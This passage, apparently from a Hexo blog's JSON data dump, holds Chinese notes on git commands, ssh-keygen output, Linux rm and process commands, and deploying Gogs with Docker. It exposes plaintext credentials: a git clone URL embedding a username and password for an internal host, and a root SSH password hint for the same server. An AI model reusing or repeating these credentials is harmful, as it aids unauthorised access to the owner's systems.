id”)<br>本地代码库回滚</p>\n<ul>\n<li>git reset –hard commit-id :回滚到commit-id，将commit-id之后提交的commit都去除</li>\n<li>git reset –hard HEAD~3：将最近3次的提交回滚</li>\n</ul>\n<h2 id=\"附：\"><a href=\"#附：\" class=\"headerlink\" title=\"附：\"></a>附：</h2><p><strong>Git 常用命令大全</strong><br>(<a href=\"http://blog.csdn.net/dengsilinming/article/details/8000622\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/dengsilinming/article/details/8000622</a>)</p>\n<p><strong>如何使用git上传代码到github</strong><br>(<a href=\"https://jingyan.baidu.com/article/e5c39bf5c8c4d039d76033b2.html\" target=\"_blank\" rel=\"noopener\">https://jingyan.baidu.com/article/e5c39bf5c8c4d039d76033b2.html</a>)</p>\n<p>常用命令,仅供参考。</p>\n<h2 id=\"单位，win10电脑\"><a href=\"#单位，win10电脑\" class=\"headerlink\" title=\"单位，win10电脑\"></a>单位，win10电脑</h2><p>  2017年12月29日 09:15:05<br>  Ubuntu SSH:</p>\n<p>  $ ssh-keygen -t rsa -C ‘903317164@qq.com’</p>\n<p>Generating public/private rsa key pair.</p>\n<p>Enter file in which to save the key (/home/LiSC/.ssh/id_rsa):<br>Created directory ‘/home/LiSC/.ssh’.<br>Enter passphrase (empty for no passphrase):<br>Enter same passphrase again:<br>Your identification has been saved in /home/LiSC/.ssh/id_rsa.<br>Your public key has been saved in /home/LiSC/.ssh/id_rsa.pub.</p>\n<p>The key fingerprint is:</p>\n<p>SHA256:SIyNEhF5sQX8YgjxEFjPBQnCFexfrL9fYLPX+L05QO0 903317164@qq.com</p>\n<p>The key’s randomart image is:</p>\n<p>+—[RSA 2048]—-+<br>|B+OO==o          |<br>|o=.=+O           |<br>| .+o*.=       .  |<br>|  .oo..+     . . |<br>|   …+ S+  . .  |<br>|     o  . + o. E |<br>|      .  . + ..  |<br>|       .  o . …|<br>|       .o.   . +o|</p>\n<h2 id=\"—-SHA256-—–\"><a href=\"#—-SHA256-—–\" class=\"headerlink\" title=\"+—-[SHA256]—–+\"></a>+—-[SHA256]—–+</h2><p>~$ ssh-keygen -t rsa - c ‘903317164@qq.com<br>生成公共/私有的rsa密钥对。<br>输入保存密钥的文件(/ home/LiSC/.ssh/id_rsa):<br>创建目录/ home / LiSC / . ssh。<br>输入passphrase(没有密码):<br>再次输入相同的密码:<br>您的身份已经保存在/ home/ lisc/. ssh/id_rsa。</p>\n<p>您的公钥已保存在/ home/ lisc/.ssh/id_rsa.pub中。</p>\n<p>指纹的关键是:<br>SHA256:SIyNEhF5sQX8YgjxEFjPBQnCFexfrL9fYLPX + L05QO0 903317164 @qq.com</p>\n<p>关键的随机图像是:</p>\n<ul>\n<li><ul>\n<li><ul>\n<li><ul>\n<li><ul>\n<li><ul>\n<li>-[RSA 2048]- - - - - +<br>| | B + OO = = o<br>| o =。= + O |<br>| + o *。=。|<br>|。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n"},{"title":"git日常","date":"2018-05-04T03:07:12.000Z","_content":"# git使用日常\n\n## 一、拉取项目添加 \"用户名：密码\"\n git clone http://`lsc:sc123456@`192.168.0.196:3000/jdyx/shrs2006.com.git\n\n 克隆时可以 添加 `用户名：密码@` uri/url\n\n<br>\n\n## 二、[\"`git commit -m`\" 与 \"`git commit -am`\" 的区别](https://segmentfault.com/q/1010000005900988)\n\n````\ngit commit -am \"str\"\n# 等同于\ngit commit -a -m \"str\"\n````\n### 拓展\n通常我们提交git的时候都是\n\n````\ngit add .\ngit commit -m \"some str\"\ngit push\n````\n这三大步，而实际上，你只需要两条命令就够了，除非有新的文件要被添加进去。\n````\ngit commit -am \"some str\"\ngit push\n````\n\n但是，`git commit -m` 和 `git commit -am`的区别在哪里？在于`a.txt`文件修改之后的处理\n\n下面，向`a.txt`添加内容'a'\n\n文件a.txt处于已跟踪，但未暂存状态。这时，如果使用`git commit -m`是无法提交最新版本的a.txt的，提交的只是最开始空内容的旧版本a.txt\n\n文件a.txt处于已跟踪，但未暂存状态。这时，如果使用`git commit -m`是无法提交最新版本的a.txt的，提交的只是最开始空内容的旧版本a.txt\n\n而如果使用`git commit -am`，则可以省略`git add a.txt`这一步，因为`git commit -am`可以提交跟踪过的文件，而`a.txt`一开始已经被跟踪过了\n\n### **总结:**\n使用这两个命令区别的`关键`就是`git add`命令\n\n`git add`命令是个多功能命令，根据目标`文件状态`不同，此命令的效果也不同：可以用它`开始跟踪新文件`，或者`把已跟踪的文件放到暂存区`，还能用于`合并时把有冲突的文件标记为已解决状态`等\n\n我们需要用`git add`命令来跟踪新文件，但如果使用`git commit -am`可以省略使用`git add`命令将已跟踪文件放到暂存区的功能","source":"_posts/GIT/git日常.md","raw":"---\ntitle: git日常\ndate: 2018-05-04 11:07:12\ntags:\n---\n# git使用日常\n\n## 一、拉取项目添加 \"用户名：密码\"\n git clone http://`lsc:sc123456@`192.168.0.196:3000/jdyx/shrs2006.com.git\n\n 克隆时可以 添加 `用户名：密码@` uri/url\n\n<br>\n\n## 二、[\"`git commit -m`\" 与 \"`git commit -am`\" 的区别](https://segmentfault.com/q/1010000005900988)\n\n````\ngit commit -am \"str\"\n# 等同于\ngit commit -a -m \"str\"\n````\n### 拓展\n通常我们提交git的时候都是\n\n````\ngit add .\ngit commit -m \"some str\"\ngit push\n````\n这三大步，而实际上，你只需要两条命令就够了，除非有新的文件要被添加进去。\n````\ngit commit -am \"some str\"\ngit push\n````\n\n但是，`git commit -m` 和 `git commit -am`的区别在哪里？在于`a.txt`文件修改之后的处理\n\n下面，向`a.txt`添加内容'a'\n\n文件a.txt处于已跟踪，但未暂存状态。这时，如果使用`git commit -m`是无法提交最新版本的a.txt的，提交的只是最开始空内容的旧版本a.txt\n\n文件a.txt处于已跟踪，但未暂存状态。这时，如果使用`git commit -m`是无法提交最新版本的a.txt的，提交的只是最开始空内容的旧版本a.txt\n\n而如果使用`git commit -am`，则可以省略`git add a.txt`这一步，因为`git commit -am`可以提交跟踪过的文件，而`a.txt`一开始已经被跟踪过了\n\n### **总结:**\n使用这两个命令区别的`关键`就是`git add`命令\n\n`git add`命令是个多功能命令，根据目标`文件状态`不同，此命令的效果也不同：可以用它`开始跟踪新文件`，或者`把已跟踪的文件放到暂存区`，还能用于`合并时把有冲突的文件标记为已解决状态`等\n\n我们需要用`git add`命令来跟踪新文件，但如果使用`git commit -am`可以省略使用`git add`命令将已跟踪文件放到暂存区的功能","slug":"GIT/git日常","published":1,"updated":"2018-05-08T02:34:02.221Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i29q002db8xj6j5kbhe1","content":"<h1 id=\"git使用日常\"><a href=\"#git使用日常\" class=\"headerlink\" title=\"git使用日常\"></a>git使用日常</h1><h2 id=\"一、拉取项目添加-“用户名：密码”\"><a href=\"#一、拉取项目添加-“用户名：密码”\" class=\"headerlink\" title=\"一、拉取项目添加 “用户名：密码”\"></a>一、拉取项目添加 “用户名：密码”</h2><p> git clone <a href=\"http://`lsc:sc123456@`192.168.0.196:3000/jdyx/shrs2006.com.git\" target=\"_blank\" rel=\"noopener\">http://`lsc:sc123456@`192.168.0.196:3000/jdyx/shrs2006.com.git</a></p>\n<p> 克隆时可以 添加 <code>用户名：密码@</code> uri/url</p>\n<p><br></p>\n<h2 id=\"二、“git-commit-m“-与-“git-commit-am“-的区别\"><a href=\"#二、“git-commit-m“-与-“git-commit-am“-的区别\" class=\"headerlink\" title=\"二、“git commit -m“ 与 “git commit -am“ 的区别\"></a>二、<a href=\"https://segmentfault.com/q/1010000005900988\" target=\"_blank\" rel=\"noopener\">“<code>git commit -m</code>“ 与 “<code>git commit -am</code>“ 的区别</a></h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git commit -am &quot;str&quot;</span><br><span class=\"line\"># 等同于</span><br><span class=\"line\">git commit -a -m &quot;str&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"拓展\"><a href=\"#拓展\" class=\"headerlink\" title=\"拓展\"></a>拓展</h3><p>通常我们提交git的时候都是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git add .</span><br><span class=\"line\">git commit -m &quot;some str&quot;</span><br><span class=\"line\">git push</span><br></pre></td></tr></table></figure>\n<p>这三大步，而实际上，你只需要两条命令就够了，除非有新的文件要被添加进去。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git commit -am &quot;some str&quot;</span><br><span class=\"line\">git push</span><br></pre></td></tr></table></figure></p>\n<p>但是，<code>git commit -m</code> 和 <code>git commit -am</code>的区别在哪里？在于<code>a.txt</code>文件修改之后的处理</p>\n<p>下面，向<code>a.txt</code>添加内容’a’</p>\n<p>文件a.txt处于已跟踪，但未暂存状态。这时，如果使用<code>git commit -m</code>是无法提交最新版本的a.txt的，提交的只是最开始空内容的旧版本a.txt</p>\n<p>文件a.txt处于已跟踪，但未暂存状态。这时，如果使用<code>git commit -m</code>是无法提交最新版本的a.txt的，提交的只是最开始空内容的旧版本a.txt</p>\n<p>而如果使用<code>git commit -am</code>，则可以省略<code>git add a.txt</code>这一步，因为<code>git commit -am</code>可以提交跟踪过的文件，而<code>a.txt</code>一开始已经被跟踪过了</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结:\"></a><strong>总结:</strong></h3><p>使用这两个命令区别的<code>关键</code>就是<code>git add</code>命令</p>\n<p><code>git add</code>命令是个多功能命令，根据目标<code>文件状态</code>不同，此命令的效果也不同：可以用它<code>开始跟踪新文件</code>，或者<code>把已跟踪的文件放到暂存区</code>，还能用于<code>合并时把有冲突的文件标记为已解决状态</code>等</p>\n<p>我们需要用<code>git add</code>命令来跟踪新文件，但如果使用<code>git commit -am</code>可以省略使用<code>git add</code>命令将已跟踪文件放到暂存区的功能</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"git使用日常\"><a href=\"#git使用日常\" class=\"headerlink\" title=\"git使用日常\"></a>git使用日常</h1><h2 id=\"一、拉取项目添加-“用户名：密码”\"><a href=\"#一、拉取项目添加-“用户名：密码”\" class=\"headerlink\" title=\"一、拉取项目添加 “用户名：密码”\"></a>一、拉取项目添加 “用户名：密码”</h2><p> git clone <a href=\"http://`lsc:sc123456@`192.168.0.196:3000/jdyx/shrs2006.com.git\" target=\"_blank\" rel=\"noopener\">http://`lsc:sc123456@`192.168.0.196:3000/jdyx/shrs2006.com.git</a></p>\n<p> 克隆时可以 添加 <code>用户名：密码@</code> uri/url</p>\n<p><br></p>\n<h2 id=\"二、“git-commit-m“-与-“git-commit-am“-的区别\"><a href=\"#二、“git-commit-m“-与-“git-commit-am“-的区别\" class=\"headerlink\" title=\"二、“git commit -m“ 与 “git commit -am“ 的区别\"></a>二、<a href=\"https://segmentfault.com/q/1010000005900988\" target=\"_blank\" rel=\"noopener\">“<code>git commit -m</code>“ 与 “<code>git commit -am</code>“ 的区别</a></h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git commit -am &quot;str&quot;</span><br><span class=\"line\"># 等同于</span><br><span class=\"line\">git commit -a -m &quot;str&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"拓展\"><a href=\"#拓展\" class=\"headerlink\" title=\"拓展\"></a>拓展</h3><p>通常我们提交git的时候都是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git add .</span><br><span class=\"line\">git commit -m &quot;some str&quot;</span><br><span class=\"line\">git push</span><br></pre></td></tr></table></figure>\n<p>这三大步，而实际上，你只需要两条命令就够了，除非有新的文件要被添加进去。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git commit -am &quot;some str&quot;</span><br><span class=\"line\">git push</span><br></pre></td></tr></table></figure></p>\n<p>但是，<code>git commit -m</code> 和 <code>git commit -am</code>的区别在哪里？在于<code>a.txt</code>文件修改之后的处理</p>\n<p>下面，向<code>a.txt</code>添加内容’a’</p>\n<p>文件a.txt处于已跟踪，但未暂存状态。这时，如果使用<code>git commit -m</code>是无法提交最新版本的a.txt的，提交的只是最开始空内容的旧版本a.txt</p>\n<p>文件a.txt处于已跟踪，但未暂存状态。这时，如果使用<code>git commit -m</code>是无法提交最新版本的a.txt的，提交的只是最开始空内容的旧版本a.txt</p>\n<p>而如果使用<code>git commit -am</code>，则可以省略<code>git add a.txt</code>这一步，因为<code>git commit -am</code>可以提交跟踪过的文件，而<code>a.txt</code>一开始已经被跟踪过了</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结:\"></a><strong>总结:</strong></h3><p>使用这两个命令区别的<code>关键</code>就是<code>git add</code>命令</p>\n<p><code>git add</code>命令是个多功能命令，根据目标<code>文件状态</code>不同，此命令的效果也不同：可以用它<code>开始跟踪新文件</code>，或者<code>把已跟踪的文件放到暂存区</code>，还能用于<code>合并时把有冲突的文件标记为已解决状态</code>等</p>\n<p>我们需要用<code>git add</code>命令来跟踪新文件，但如果使用<code>git commit -am</code>可以省略使用<code>git add</code>命令将已跟踪文件放到暂存区的功能</p>\n"},{"title":"BGP多线","date":"2018-06-25T10:29:52.000Z","_content":"## [BGP概念](https://baike.baidu.com/item/BGP多线)\n\n## [互联网AS(自治系统)](https://baike.baidu.com/item/自治系统)\n\n## [边界网关协议](https://baike.baidu.com/item/边界网关协议)","source":"_posts/HTTP/BGP多线.md","raw":"---\ntitle: BGP多线\ndate: 2018-06-25 18:29:52\ntags: BGP\ncategories: HTTP\n---\n## [BGP概念](https://baike.baidu.com/item/BGP多线)\n\n## [互联网AS(自治系统)](https://baike.baidu.com/item/自治系统)\n\n## [边界网关协议](https://baike.baidu.com/item/边界网关协议)","slug":"HTTP/BGP多线","published":1,"updated":"2018-06-25T10:35:37.394Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i29r002hb8xj83poa6sp","content":"<h2 id=\"BGP概念\"><a href=\"#BGP概念\" class=\"headerlink\" title=\"BGP概念\"></a><a href=\"https://baike.baidu.com/item/BGP多线\" target=\"_blank\" rel=\"noopener\">BGP概念</a></h2><h2 id=\"互联网AS-自治系统\"><a href=\"#互联网AS-自治系统\" class=\"headerlink\" title=\"互联网AS(自治系统)\"></a><a href=\"https://baike.baidu.com/item/自治系统\" target=\"_blank\" rel=\"noopener\">互联网AS(自治系统)</a></h2><h2 id=\"边界网关协议\"><a href=\"#边界网关协议\" class=\"headerlink\" title=\"边界网关协议\"></a><a href=\"https://baike.baidu.com/item/边界网关协议\" target=\"_blank\" rel=\"noopener\">边界网关协议</a></h2>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"BGP概念\"><a href=\"#BGP概念\" class=\"headerlink\" title=\"BGP概念\"></a><a href=\"https://baike.baidu.com/item/BGP多线\" target=\"_blank\" rel=\"noopener\">BGP概念</a></h2><h2 id=\"互联网AS-自治系统\"><a href=\"#互联网AS-自治系统\" class=\"headerlink\" title=\"互联网AS(自治系统)\"></a><a href=\"https://baike.baidu.com/item/自治系统\" target=\"_blank\" rel=\"noopener\">互联网AS(自治系统)</a></h2><h2 id=\"边界网关协议\"><a href=\"#边界网关协议\" class=\"headerlink\" title=\"边界网关协议\"></a><a href=\"https://baike.baidu.com/item/边界网关协议\" target=\"_blank\" rel=\"noopener\">边界网关协议</a></h2>"},{"title":"Linux-進程管理","date":"2018-05-05T08:00:24.000Z","archives":"Linux-進程管理","_content":"## Linux-進程管理\n> ps aux | grep [process]\n\n> kill [process ID]\n\n> pm2 status # 查看pm2狀態","source":"_posts/Linux/Linux-進程管理.md","raw":"---\ntitle: Linux-進程管理\ndate: 2018-05-05 16:00:24\ntags: Linux-process\narchives: Linux-進程管理\ncategories: Linux\n---\n## Linux-進程管理\n> ps aux | grep [process]\n\n> kill [process ID]\n\n> pm2 status # 查看pm2狀態","slug":"Linux/Linux-進程管理","published":1,"updated":"2018-05-05T09:35:34.280Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i29t002jb8xj1i000tlq","content":"<h2 id=\"Linux-進程管理\"><a href=\"#Linux-進程管理\" class=\"headerlink\" title=\"Linux-進程管理\"></a>Linux-進程管理</h2><blockquote>\n<p>ps aux | grep [process]</p>\n<p>kill [process ID]</p>\n<p>pm2 status # 查看pm2狀態</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Linux-進程管理\"><a href=\"#Linux-進程管理\" class=\"headerlink\" title=\"Linux-進程管理\"></a>Linux-進程管理</h2><blockquote>\n<p>ps aux | grep [process]</p>\n<p>kill [process ID]</p>\n<p>pm2 status # 查看pm2狀態</p>\n</blockquote>\n"},{"title":"Linux命令行学习","date":"2018-06-21T09:04:39.000Z","_content":"## Linux主流命令\n````\npwd: 显示当前目录路径\n\ndirs: 显示当前目录路径\n````\n\n\n","source":"_posts/Linux/Linux命令行学习.md","raw":"---\ntitle: Linux命令行学习\ndate: 2018-06-21 17:04:39\ntags: Cli\ncategories: Linux\n---\n## Linux主流命令\n````\npwd: 显示当前目录路径\n\ndirs: 显示当前目录路径\n````\n\n\n","slug":"Linux/Linux命令行学习","published":1,"updated":"2018-06-22T07:19:38.224Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i29u002mb8xjdy9f1y1j","content":"<h2 id=\"Linux主流命令\"><a href=\"#Linux主流命令\" class=\"headerlink\" title=\"Linux主流命令\"></a>Linux主流命令</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwd: 显示当前目录路径</span><br><span class=\"line\"></span><br><span class=\"line\">dirs: 显示当前目录路径</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Linux主流命令\"><a href=\"#Linux主流命令\" class=\"headerlink\" title=\"Linux主流命令\"></a>Linux主流命令</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwd: 显示当前目录路径</span><br><span class=\"line\"></span><br><span class=\"line\">dirs: 显示当前目录路径</span><br></pre></td></tr></table></figure>\n"},{"title":"Vim大全","date":"2018-06-12T02:22:50.000Z","_content":"| Name | Academy | score |\n| - | :-: | -: | :-: |\n| Harry Potter | Gryffindor| 90 | \n| Hermione Granger | Gryffindor | 100 | \n| Draco Malfoy | Slytherin | 90 |","source":"_posts/Linux/Vim大全.md","raw":"---\ntitle: Vim大全\ndate: 2018-06-12 10:22:50\ntags:\ncategories:\n---\n| Name | Academy | score |\n| - | :-: | -: | :-: |\n| Harry Potter | Gryffindor| 90 | \n| Hermione Granger | Gryffindor | 100 | \n| Draco Malfoy | Slytherin | 90 |","slug":"Linux/Vim大全","published":1,"updated":"2018-06-22T01:07:51.444Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i29w002pb8xjqy2wt19z","content":"<table>\n<thead>\n<tr>\n<th>Name</th>\n<th style=\"text-align:center\">Academy</th>\n<th style=\"text-align:right\">score</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Harry Potter</td>\n<td style=\"text-align:center\">Gryffindor</td>\n<td style=\"text-align:right\">90</td>\n</tr>\n<tr>\n<td>Hermione Granger</td>\n<td style=\"text-align:center\">Gryffindor</td>\n<td style=\"text-align:right\">100</td>\n</tr>\n<tr>\n<td>Draco Malfoy</td>\n<td style=\"text-align:center\">Slytherin</td>\n<td style=\"text-align:right\">90</td>\n</tr>\n</tbody>\n</table>\n","site":{"data":{}},"excerpt":"","more":"<table>\n<thead>\n<tr>\n<th>Name</th>\n<th style=\"text-align:center\">Academy</th>\n<th style=\"text-align:right\">score</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Harry Potter</td>\n<td style=\"text-align:center\">Gryffindor</td>\n<td style=\"text-align:right\">90</td>\n</tr>\n<tr>\n<td>Hermione Granger</td>\n<td style=\"text-align:center\">Gryffindor</td>\n<td style=\"text-align:right\">100</td>\n</tr>\n<tr>\n<td>Draco Malfoy</td>\n<td style=\"text-align:center\">Slytherin</td>\n<td style=\"text-align:right\">90</td>\n</tr>\n</tbody>\n</table>\n"},{"title":"Linux 删除文件夹和文件的命令","date":"2018-04-28T08:32:00.000Z","archives":"删除命令","_content":"# Linux 删除文件夹和文件的命令\n+ -r 就是向下递归，不管有多少级目录，一并删除\n+ -f 就是直接强行删除，不作任何提示的意思\n\n## 删除文件夹实例：\n    rm -rf /var/log/httpd/access\n\n将会删除`/var/log/httpd/access`目录以及其下所有文件、文件夹\n\n## 删除文件使用实例：\n\n    rm -f /var/log/httpd/access.log\n\n将会强制删除`/var/log/httpd/access.log`这个文件","source":"_posts/Linux/linux 删除.md","raw":"---\ntitle: Linux 删除文件夹和文件的命令\ndate: 2018-04-28 16:32:00\ntags: Linux 删除命令\narchives: 删除命令\ncategories: Linux\n---\n# Linux 删除文件夹和文件的命令\n+ -r 就是向下递归，不管有多少级目录，一并删除\n+ -f 就是直接强行删除，不作任何提示的意思\n\n## 删除文件夹实例：\n    rm -rf /var/log/httpd/access\n\n将会删除`/var/log/httpd/access`目录以及其下所有文件、文件夹\n\n## 删除文件使用实例：\n\n    rm -f /var/log/httpd/access.log\n\n将会强制删除`/var/log/httpd/access.log`这个文件","slug":"Linux/linux 删除","published":1,"updated":"2018-05-05T01:24:42.424Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i29x002rb8xjudb2wir3","content":"<h1 id=\"Linux-删除文件夹和文件的命令\"><a href=\"#Linux-删除文件夹和文件的命令\" class=\"headerlink\" title=\"Linux 删除文件夹和文件的命令\"></a>Linux 删除文件夹和文件的命令</h1><ul>\n<li>-r 就是向下递归，不管有多少级目录，一并删除</li>\n<li>-f 就是直接强行删除，不作任何提示的意思</li>\n</ul>\n<h2 id=\"删除文件夹实例：\"><a href=\"#删除文件夹实例：\" class=\"headerlink\" title=\"删除文件夹实例：\"></a>删除文件夹实例：</h2><pre><code>rm -rf /var/log/httpd/access\n</code></pre><p>将会删除<code>/var/log/httpd/access</code>目录以及其下所有文件、文件夹</p>\n<h2 id=\"删除文件使用实例：\"><a href=\"#删除文件使用实例：\" class=\"headerlink\" title=\"删除文件使用实例：\"></a>删除文件使用实例：</h2><pre><code>rm -f /var/log/httpd/access.log\n</code></pre><p>将会强制删除<code>/var/log/httpd/access.log</code>这个文件</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Linux-删除文件夹和文件的命令\"><a href=\"#Linux-删除文件夹和文件的命令\" class=\"headerlink\" title=\"Linux 删除文件夹和文件的命令\"></a>Linux 删除文件夹和文件的命令</h1><ul>\n<li>-r 就是向下递归，不管有多少级目录，一并删除</li>\n<li>-f 就是直接强行删除，不作任何提示的意思</li>\n</ul>\n<h2 id=\"删除文件夹实例：\"><a href=\"#删除文件夹实例：\" class=\"headerlink\" title=\"删除文件夹实例：\"></a>删除文件夹实例：</h2><pre><code>rm -rf /var/log/httpd/access\n</code></pre><p>将会删除<code>/var/log/httpd/access</code>目录以及其下所有文件、文件夹</p>\n<h2 id=\"删除文件使用实例：\"><a href=\"#删除文件使用实例：\" class=\"headerlink\" title=\"删除文件使用实例：\"></a>删除文件使用实例：</h2><pre><code>rm -f /var/log/httpd/access.log\n</code></pre><p>将会强制删除<code>/var/log/httpd/access.log</code>这个文件</p>\n"},{"title":"linux下docker部署gogs git仓库","date":"2018-05-04T01:50:00.000Z","archives":"git仓库","_content":"# linux下docker部署gogs git仓库\n\n## 1. 远程登录Linux服务器\n首先，linux 命令行使用 root ssh ( [ssh远程登录命令简单实例](https://blog.csdn.net/ccfxue/article/details/52608829) )\n\n例如: [公司内网服务器]\n````\nssh root@192.168.0.196\n\npsd: Jdyx[5个8]\n````\n\n## 2. 拉取docker下gogs\n进入[gogs官网](https://hub.docker.com/r/gogs/gogs/)，在官网左侧找到 拉取命令\n\n命令行输入 拉取命令 `docker pull gogs/gogs`\n\n拉取完成后 有提示，接着输入查看状态的`docker`命令 `docker ps`\n\n\"`docker ps`\": 属于Linux命令 是查看 `docker`状态的命令\n\n\"`ls`\": 查看当前目录文件\n\n## 3. 配置\n\"`vim gogs.docker`\": 进入并编辑 gogs.docker 配置文件\n\n[gogs-git官网 配置](https://github.com/gogits/gogs/tree/master/docker)\n\n````\n# Pull image from Docker Hub.\n$ docker pull gogs/gogs\n\n# Create local directory for volume.\n$ mkdir -p /var/gogs\n\n# Use `docker run` for the first time.\n$ docker run --name=gogs -p 10022:22 -p 10080:3000 -v /var/gogs:/data gogs/gogs\n\n# Use `docker start` if you have stopped it.\n$ docker start gogs\n````\n\n配置文件：\n````\n#!/bin/bash\ndocker run --restart=always --name=gogs -p 3000:3000 -v /var/gogs:/data gogs/gogs\n````\n\n\n## 4. 运行\n\"`chmod +x gogs.docker`\": \n\n\"`echo $PATH`\": 打印 环境变量\n\n\"`./gogs.docker`\"：启动服务\n\n## 5. 重启服务\n`docker ps`获取`CONTAINER ID`\n\n`docker restart [19d724ea6ec9(ID)]`\n\n\n\n","source":"_posts/Linux/linux下docker部署gogs-git仓库.md","raw":"---\ntitle: linux下docker部署gogs git仓库\ndate: 2018-05-04 09:50:00\ntags: gogs docker\narchives: git仓库\ncategories: git\n---\n# linux下docker部署gogs git仓库\n\n## 1. 远程登录Linux服务器\n首先，linux 命令行使用 root ssh ( [ssh远程登录命令简单实例](https://blog.csdn.net/ccfxue/article/details/52608829) )\n\n例如: [公司内网服务器]\n````\nssh root@192.168.0.196\n\npsd: Jdyx[5个8]\n````\n\n## 2. 拉取docker下gogs\n进入[gogs官网](https://hub.docker.com/r/gogs/gogs/)，在官网左侧找到 拉取命令\n\n命令行输入 拉取命令 `docker pull gogs/gogs`\n\n拉取完成后 有提示，接着输入查看状态的`docker`命令 `docker ps`\n\n\"`docker ps`\": 属于Linux命令 是查看 `docker`状态的命令\n\n\"`ls`\": 查看当前目录文件\n\n## 3. 配置\n\"`vim gogs.docker`\": 进入并编辑 gogs.docker 配置文件\n\n[gogs-git官网 配置](https://github.com/gogits/gogs/tree/master/docker)\n\n````\n# Pull image from Docker Hub.\n$ docker pull gogs/gogs\n\n# Create local directory for volume.\n$ mkdir -p /var/gogs\n\n# Use `docker run` for the first time.\n$ docker run --name=gogs -p 10022:22 -p 10080:3000 -v /var/gogs:/data gogs/gogs\n\n# Use `docker start` if you have stopped it.\n$ docker start gogs\n````\n\n配置文件：\n````\n#!/bin/bash\ndocker run --restart=always --name=gogs -p 3000:3000 -v /var/gogs:/data gogs/gogs\n````\n\n\n## 4. 运行\n\"`chmod +x gogs.docker`\": \n\n\"`echo $PATH`\": 打印 环境变量\n\n\"`./gogs.docker`\"：启动服务\n\n## 5. 重启服务\n`docker ps`获取`CONTAINER ID`\n\n`docker restart [19d724ea6ec9(ID)]`\n\n\n\n","slug":"Linux/linux下docker部署gogs-git仓库","published":1,"updated":"2018-06-21T09:02:16.365Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i29y002vb8xjsv8d9s3e","content":"<h1 id=\"linux下docker部署gogs-git仓库\"><a href=\"#linux下docker部署gogs-git仓库\" class=\"headerlink\" title=\"linux下docker部署gogs git仓库\"></a>linux下docker部署gogs git仓库</h1><h2 id=\"1-远程登录Linux服务器\"><a href=\"#1-远程登录Linux服务器\" class=\"headerlink\" title=\"1. 远程登录Linux服务器\"></a>1. 远程登录Linux服务器</h2><p>首先，linux 命令行使用 root ssh ( <a href=\"https://blog.csdn.net/ccfxue/article/details/52608829\" target=\"_blank\" rel=\"noopener\">ssh远程登录命令简单实例</a> )</p>\n<p>例如: [公司内网服务器]<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh root@192.168.0.196</span><br><span class=\"line\"></span><br><span class=\"line\">psd: Jdyx[5个8]</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"2-拉取docker下gogs\"><a href=\"#2-拉取docker下gogs\" class=\"headerlink\" title=\"2. 拉取docker下gogs\"></a>2. 拉取docker下gogs</h2><p>进入<a href=\"https://hub.docker.com/r/gogs/gogs/\" target=\"_blank\" rel=\"noopener\">gogs官网</a>，在官网左侧找到 拉取命令</p>\n<p>命令行输入 拉取命令 <code>docker pull gogs/gogs</code></p>\n<p>拉取完成后 有提示，接着输入查看状态的<code>docker</code>命令 <code>docker ps</code></p>\n<p>“<code>docker ps</code>“: 属于Linux命令 是查看 <code>docker</code>状态的命令</p>\n<p>“<code>ls</code>“: 查看当前目录文件</p>\n<h2 id=\"3-配置\"><a href=\"#3-配置\" class=\"headerlink\" title=\"3. 配置\"></a>3. 配置</h2><p>“<code>vim gogs.docker</code>“: 进入并编辑 gogs.docker 配置文件</p>\n<p><a href=\"https://github.com/gogits/gogs/tree/master/docker\" target=\"_blank\" 